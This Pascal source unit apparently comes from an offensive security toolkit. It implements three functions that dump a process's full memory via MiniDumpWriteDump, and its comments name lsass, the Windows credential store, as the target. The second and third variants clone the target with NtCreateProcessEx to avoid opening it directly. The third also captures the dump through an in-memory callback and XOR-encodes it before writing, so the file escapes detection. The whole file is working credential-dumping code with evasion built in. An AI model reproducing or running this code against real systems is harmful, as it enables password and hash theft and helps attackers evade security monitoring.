unit uimagehlp;

{$mode delphi}

interface

uses
  Classes, SysUtils,windows,
  utils,ntdll,uxor;

const
  MiniDumpNormal         = $0000;
  {$EXTERNALSYM MiniDumpNormal}
  MiniDumpWithDataSegs   = $0001;
  {$EXTERNALSYM MiniDumpWithDataSegs}
  MiniDumpWithFullMemory = $0002;
  {$EXTERNALSYM MiniDumpWithFullMemory}
  MiniDumpWithHandleData = $0004;
  {$EXTERNALSYM MiniDumpWithHandleData}
  MiniDumpFilterMemory   = $0008;
  {$EXTERNALSYM MiniDumpFilterMemory}
  MiniDumpScanMemory     = $0010;
  {$EXTERNALSYM MiniDumpScanMemory}
  MiniDumpWithUnloadedModules            = $0020;
  {$EXTERNALSYM MiniDumpWithUnloadedModules}
  MiniDumpWithIndirectlyReferencedMemory = $0040;
  {$EXTERNALSYM MiniDumpWithIndirectlyReferencedMemory}
  MiniDumpFilterModulePaths              = $0080;
  {$EXTERNALSYM MiniDumpFilterModulePaths}
  MiniDumpWithProcessThreadData          = $0100;
  {$EXTERNALSYM MiniDumpWithProcessThreadData}
  MiniDumpWithPrivateReadWriteMemory     = $0200;
  {$EXTERNALSYM MiniDumpWithPrivateReadWriteMemory}

  type
  _MINIDUMP_TYPE = DWORD;
  {$EXTERNALSYM _MINIDUMP_TYPE}
  MINIDUMP_TYPE = _MINIDUMP_TYPE;
  {$EXTERNALSYM MINIDUMP_TYPE}
  TMinidumpType = MINIDUMP_TYPE;

  //**************************************************************

   MINIDUMP_CALLBACK_TYPE = (
    ModuleCallback, //0
            ThreadCallback,  //1
            ThreadExCallback,
            IncludeThreadCallback,
            IncludeModuleCallback,
            MemoryCallback,
            CancelCallback,
            WriteKernelMinidumpCallback,
            KernelMinidumpStatusCallback,
            RemoveMemoryCallback,
            IncludeVmRegionCallback,
            IoStartCallback, //11
            IoWriteAllCallback, //12
            IoFinishCallback,  //13
            ReadMemoryFailureCallback, //14
            SecondaryFlagsCallback, //15
            IsProcessSnapshotCallback, //16
            VmStartCallback,
            VmQueryCallback,
            VmPreReadCallback,
            VmPostReadCallback);

  PMINIDUMP_THREAD_CALLBACK = ^MINIDUMP_THREAD_CALLBACK;
  {$EXTERNALSYM PMINIDUMP_THREAD_CALLBACK}
  MINIDUMP_THREAD_CALLBACK = record
    ThreadId: ULONG;
    ThreadHandle: HANDLE;
    Context: CONTEXT;
    SizeOfContext: ULONG;
    StackBase: ULONG64;
    StackEnd: ULONG64;
  end;

  PMINIDUMP_THREAD_EX_CALLBACK = ^MINIDUMP_THREAD_EX_CALLBACK;
   {$EXTERNALSYM PMINIDUMP_THREAD_EX_CALLBACK}
   MINIDUMP_THREAD_EX_CALLBACK = record
     ThreadId: ULONG;
     ThreadHandle: HANDLE;
     Context: CONTEXT;
     SizeOfContext: ULONG;
     StackBase: ULONG64;
     StackEnd: ULONG64;
     BackingStoreBase: ULONG64;
     BackingStoreEnd: ULONG64;
   end;

   PMINIDUMP_MODULE_CALLBACK = ^MINIDUMP_MODULE_CALLBACK;
     {$EXTERNALSYM PMINIDUMP_MODULE_CALLBACK}
     MINIDUMP_MODULE_CALLBACK = record
       FullPath: PWCHAR;
       BaseOfImage: ULONG64;
       SizeOfImage: ULONG;
       CheckSum: ULONG;
       TimeDateStamp: ULONG;
       VersionInfo: VS_FIXEDFILEINFO;
       CvRecord: PVOID;
       SizeOfCvRecord: ULONG;
       MiscRecord: PVOID;
       SizeOfMiscRecord: ULONG;
     end;

     PMINIDUMP_INCLUDE_THREAD_CALLBACK = ^MINIDUMP_INCLUDE_THREAD_CALLBACK;
       {$EXTERNALSYM PMINIDUMP_INCLUDE_THREAD_CALLBACK}
       MINIDUMP_INCLUDE_THREAD_CALLBACK = record
         ThreadId: ULONG;
       end;

       PMINIDUMP_INCLUDE_MODULE_CALLBACK = ^MINIDUMP_INCLUDE_MODULE_CALLBACK;
         {$EXTERNALSYM PMINIDUMP_INCLUDE_MODULE_CALLBACK}
         MINIDUMP_INCLUDE_MODULE_CALLBACK = record
           BaseOfImage: ULONG64;
         end;

 type MINIDUMP_IO_CALLBACK =record
   Handle:HANDLE;
   Offset:ULONG64;
   Buffer:PVOID;
   BufferBytes:ULONG;
end;
 PMINIDUMP_IO_CALLBACK=^MINIDUMP_IO_CALLBACK;

 //packed or not packed??
 //https://github.com/b4rtik/SharpMiniDump/blob/master/SharpMiniDump/Natives.cs
  MINIDUMP_CALLBACK_INPUT = packed record
      //const int CallbackTypeOffset = 4 + 8;
      //const int UnionOffset = CallbackTypeOffset + 4;
      //[FieldOffset(0)]
      ProcessId: ULONG;
      //[FieldOffset(4)]
      ProcessHandle: HANDLE;
      //[FieldOffset(CallbackTypeOffset)]
      CallbackType: ULONG; //4+8
      //[FieldOffset(UnionOffset)]
      case Integer of
        //0: status:int;
        0: (Thread: MINIDUMP_THREAD_CALLBACK);
        1: (ThreadEx: MINIDUMP_THREAD_EX_CALLBACK);
        2: (Module: MINIDUMP_MODULE_CALLBACK);
        3: (IncludeThread: MINIDUMP_INCLUDE_THREAD_CALLBACK);
        4: (IncludeModule: MINIDUMP_INCLUDE_MODULE_CALLBACK);
        5: (Io:MINIDUMP_IO_CALLBACK);
    end;
  PMINIDUMP_CALLBACK_INPUT = ^MINIDUMP_CALLBACK_INPUT;

  PMINIDUMP_MEMORY_INFO = ^MINIDUMP_MEMORY_INFO;
  MINIDUMP_MEMORY_INFO =record
     BaseAddress:ULONG64;
     AllocationBase:ULONG64;
     AllocationProtect:ULONG32;
     __alignment1:ULONG32;
     RegionSize:ULONG64;
     State:ULONG32;
     Protect:ULONG32;
     Type_:ULONG32;
     __alignment2:ULONG32;
  end;


  PMINIDUMP_CALLBACK_OUTPUT = ^MINIDUMP_CALLBACK_OUTPUT;

  //A revoir !!!
  MINIDUMP_CALLBACK_OUTPUT =record
  ////union {
  //   ModuleWriteFlags:ULONG;
  //   ThreadWriteFlags:ULONG;
  //   SecondaryFlags:ULONG;
  ////struct {
  //   MemoryBase:ULONG64;
  //   MemorySize:ULONG;
  //  //};
  ////struct {
  //   CheckCancel:BOOL;
  //   Cancel:BOOL;
  //  //};
  //  Handle:HANDLE;
  //  //};
  ////struct {
  //  VmRegion:MINIDUMP_MEMORY_INFO;
  //  Continue:BOOL;
  //  //};
  Status:HRESULT;
  end;


  //  {$EXTERNALSYM PMINIDUMP_CALLBACK_OUTPUT}
  //  MINIDUMP_CALLBACK_OUTPUT = record
  //    case Integer of
  //      0: (ModuleWriteFlags: ULONG);
  //      1: (ThreadWriteFlags: ULONG);
  //  end;

  MINIDUMP_CALLBACK_ROUTINE = function(CallbackParam: PVOID; CallbackInput: PMINIDUMP_CALLBACK_INPUT;CallbackOutput: PMINIDUMP_CALLBACK_OUTPUT): BOOL; stdcall;

  type MINIDUMP_CALLBACK_INFORMATION =record
  CallbackRoutine:MINIDUMP_CALLBACK_ROUTINE;
  CallbackParam:PVOID;
  end;
  PMINIDUMP_CALLBACK_INFORMATION=^MINIDUMP_CALLBACK_INFORMATION;

  //**********************************************************************

  //function MiniDumpWriteDump(hProcess: HANDLE; ProcessId: DWORD; hFile: HANDLE; DumpType: MINIDUMP_TYPE; ExceptionParam: pointer; UserStreamParam: pointer; CallbackParam: pointer): BOOL; stdcall; external 'Dbghelp.dll';
{$EXTERNALSYM MiniDumpWriteDump}

//
function dumpprocess0(pid:dword):boolean;
function dumpprocess2(pid:dword):boolean;
function dumpprocess3(pid:dword):boolean;

implementation

var
MiniDumpWriteDump:function (hProcess: HANDLE; ProcessId: DWORD; hFile: HANDLE; DumpType: MINIDUMP_TYPE; ExceptionParam: pointer; UserStreamParam: pointer; CallbackParam: pointer): BOOL; stdcall;

dumpBuffer:LPVOID;
bytesRead:DWORD = 0;

//the original...
function dumpprocess0(pid:dword):boolean;
var
  processHandle,hfile:thandle;
  //
  {$IFDEF win32}lib:cardinal;{$endif}
{$IFDEF win64}lib:int64;{$endif}
begin
log('******** dumpprocess ********');
lib:=0;
lib:=loadlibrary(pchar(sysdir+'\dbghelp.dll')); //we go for the default system one
if lib<=0 then
  begin
  raise exception.Create  ('could not loadlibrary:'+inttostr(getlasterror));
  exit;
  end;
MiniDumpWriteDump:=getProcAddress(lib,'MiniDumpWriteDump');
//
processHandle:=thandle(-1);
processHandle := OpenProcess(PROCESS_ALL_ACCESS, false, PID);
if processHandle<>thandle(-1) then
   begin
   hFile := CreateFile(pchar(inttostr(pid)+'.dmp'), GENERIC_ALL, 0, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
   result := MiniDumpWriteDump(processHandle, pid, hfile, MiniDumpWithFullMemory, nil, nil, nil);
   if result=false
      then log('MiniDumpWriteDump failed,'+inttohex(getlasterror,sizeof(dword)))
      else log(inttostr(pid)+'.dmp'+ ' written',1);
   closehandle(hfile);
   closehandle(processHandle );
   end
   else log('OpenProcess failed');
 end;

//using NtCreateProcessEx
function dumpprocess2(pid:dword):boolean;
var
  status:ntstatus;
  clone,processHandle,hfile:thandle;
  //
  {$IFDEF win32}lib:cardinal;{$endif}
{$IFDEF win64}lib:int64;{$endif}
begin
log('******** dumpprocess2 ********');
lib:=0;
lib:=loadlibrary(pchar(sysdir+'\dbghelp.dll')); //we go for the default system one
if lib<=0 then
  begin
  raise exception.Create  ('could not loadlibrary:'+inttostr(getlasterror));
  exit;
  end;
//
processHandle:=thandle(-1);
processHandle := OpenProcess(PROCESS_CREATE_PROCESS, false, PID);
if processHandle<>thandle(-1) then
   begin
   //
   ZeroMemory(@clone,sizeof(clone));
   status := NtCreateProcessEx(@clone,PROCESS_ALL_ACCESS,nil,processHandle,0,0,0,0,false);
   //
   if clone>0 then
      begin
      hFile := CreateFile(pchar(inttostr(pid)+'.dmp'), GENERIC_ALL, 0, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
      MiniDumpWriteDump:=getProcAddress(lib,'MiniDumpWriteDump');
      //lets try with pid=0 to avoid an non necessary ntopenprocess on lsass
      //https://rastamouse.me/dumping-lsass-with-duplicated-handles/
      result := MiniDumpWriteDump(clone, 0, 0, MiniDumpWithFullMemory, nil, nil, nil);
      if result=false then result := MiniDumpWriteDump(clone, pid, hfile, MiniDumpWithFullMemory, nil, nil, nil);
      if result=false
         then log('MiniDumpWriteDump failed,'+inttohex(getlasterror,sizeof(dword)))
         else log(inttostr(pid)+'.dmp'+ ' written',1);
      closehandle(hfile);
      end else log('NtCreateProcessEx failed');
   closehandle(processHandle );
   TerminateProcess(clone,0);
   closehandle(clone );
   end
   else log('OpenProcess failed');
 end;

function minidumpCallback(CallbackParam: PVOID; CallbackInput: PMINIDUMP_CALLBACK_INPUT;CallbackOutput: PMINIDUMP_CALLBACK_OUTPUT): BOOL; stdcall;
var
  	destination:LPVOID = nil;
        source:LPVOID = nil;
	bufferSize:DWORD = 0;
begin
//log('minidumpCallback:'+inttostr(callbackInput^.CallbackType));
case callbackInput^.CallbackType of
    uint(MINIDUMP_CALLBACK_TYPE.IoStartCallback):
                        begin
                        log('IoStartCallback');
			callbackOutput^.Status := S_FALSE;
                        end;

    uint(MINIDUMP_CALLBACK_TYPE.IoWriteAllCallback):
                        begin
                        //log('IoWriteAllCallback');
                        callbackOutput^.Status := S_OK;
                        // A chunk of minidump data that's been jus read from lsass.
       			// This is the data that would eventually end up in the .dmp file on the disk, but we now have access to it in memory, so we can do whatever we want with it.
       			// We will simply save it to dumpBuffer.
       			source := callbackInput^.Io.Buffer;

                        // Calculate location of where we want to store this part of the dump.
       			// Destination is start of our dumpBuffer + the offset of the minidump data
       			destination := pointer(nativeuint(dumpBuffer) + callbackInput^.Io.Offset);

       			// Size of the chunk of minidump that's just been read.
			bufferSize := callbackInput^.Io.BufferBytes;
			bytesRead := bytesread + bufferSize;

                        CopyMemory(destination, source, bufferSize);

			//log('Minidump offset:'+inttostr(callbackInput^.Io.Offset)+ ' length:'+inttostr(bufferSize));

                        end;

    uint(MINIDUMP_CALLBACK_TYPE.IoFinishCallback):
                        begin
                        log('IoFinishCallback');
    			callbackOutput^.Status := S_OK;
                        end;

    else result:=true;

end; //case

result:=true;
end;

//using NtCreateProcessEx + callback + xor
function dumpprocess3(pid:dword):boolean;
var
  status:ntstatus;
  clone,processHandle,hfile:thandle;
  callbackInfo:MINIDUMP_CALLBACK_INFORMATION;
  //
  {$IFDEF win32}lib:cardinal;{$endif}
{$IFDEF win64}lib:int64;{$endif}
begin
log('******** dumpprocess3 ********');
lib:=0;
lib:=loadlibrary(pchar(sysdir+'\dbghelp.dll')); //we go for the default system one
if lib<=0 then
  begin
  raise exception.Create  ('could not loadlibrary:'+inttostr(getlasterror));
  exit;
  end;
//
processHandle:=thandle(-1);
processHandle := OpenProcess(PROCESS_CREATE_PROCESS, false, PID);
if processHandle<>thandle(-1) then
   begin
   //
   ZeroMemory(@clone,sizeof(clone));
   status := NtCreateProcessEx(@clone,PROCESS_ALL_ACCESS,nil,processHandle,0,0,0,0,false);
   //
   if clone>0 then
      begin
      // Set up minidump callback
      	ZeroMemory(@callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
      	callbackInfo.CallbackRoutine := minidumpCallback;
      	callbackInfo.CallbackParam := nil;
      //
      dumpbuffer:=HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 256);
      log('calling MiniDumpWriteDump');
      MiniDumpWriteDump:=getProcAddress(lib,'MiniDumpWriteDump');
      //lets try with pid=0 to avoid an non necessary ntopenprocess on lsass
      //https://rastamouse.me/dumping-lsass-with-duplicated-handles/
      result := MiniDumpWriteDump(clone, 0, 0, MiniDumpWithFullMemory, nil, nil, @callbackInfo);
      if result=false then result := MiniDumpWriteDump(clone, pid, 0, MiniDumpWithFullMemory, nil, nil, @callbackInfo);
      if result=false then log('MiniDumpWriteDump failed,'+inttohex(getlasterror,sizeof(dword)));
      //save dumpbuffer...
      log('bytesRead:'+inttostr(bytesRead ));
      xorbytes(dumpbuffer,bytesread);
      hFile := CreateFile(pchar(inttostr(pid)+'.dmp.xor'), GENERIC_ALL, 0, nil, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
      writefile(hfile,dumpBuffer^,bytesRead ,bytesRead,nil);
      log(inttostr(pid)+'.dmp.xor'+ ' written - key=FF',1);
      closehandle(hfile);
      //
      heapfree(GetProcessHeap(),0,dumpbuffer);
      end else log('NtCreateProcessEx failed');
   closehandle(processHandle );
   TerminateProcess(clone,0);
   closehandle(clone );
   end
   else log('OpenProcess failed');
 end;

//initialization

end.

